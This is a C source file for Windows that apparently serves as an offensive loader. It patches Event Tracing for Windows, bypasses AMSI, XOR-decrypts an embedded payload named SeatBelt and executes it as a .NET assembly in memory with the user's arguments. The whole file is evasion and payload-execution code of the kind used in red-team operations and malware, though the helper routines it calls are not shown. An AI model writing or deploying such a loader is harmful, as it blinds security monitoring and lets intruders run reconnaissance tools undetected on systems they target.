#include "Common.h"
#include "RawData.h"

INT wmain(
    _In_ INT    nArgc,
    _In_ PWSTR* ppwszArgv
)
{
    HRESULT     hResult     = S_OK;
    ULONG       iIndex      = 0;
    static BOOL s_bDecrypted = FALSE;

    if (!EtwPatching(GetCurrentProcess()))
    {
        PRINTA("[!] EtwPatching failed\n");
        return 1;
    }

    PRINTA("[+] ETW patched\n");

    if (!SetupAmsiBypass())
    {
        PRINTA("[!] SetupAmsiBypass failed\n");
        return 1;
    }

    PRINTA("[+] AMSI patched\n");

    if (!s_bDecrypted)
    {
        for (iIndex = 0; iIndex < sSeatBeltXoredSize; iIndex++)
            bSeatBeltXored[iIndex] ^= bSeatBeltXoredKey[iIndex % sSeatBeltXoredKeySize];

        s_bDecrypted = TRUE;
    }

    // Pass argv[1..n] so the program name is not forwarded to the assembly
    hResult = DotnetExecute(
        bSeatBeltXored,
        (ULONG)sSeatBeltXoredSize,
        L"SeatBelt",
        nArgc > 1 ? ppwszArgv + 1 : NULL,
        nArgc > 1 ? nArgc - 1    : 0
    );

    if (FAILED(hResult))
    {
        PRINTA("[-] DotnetExecute failed: 0x%lx\n", hResult);
        return 1;
    }

    return 0;
}
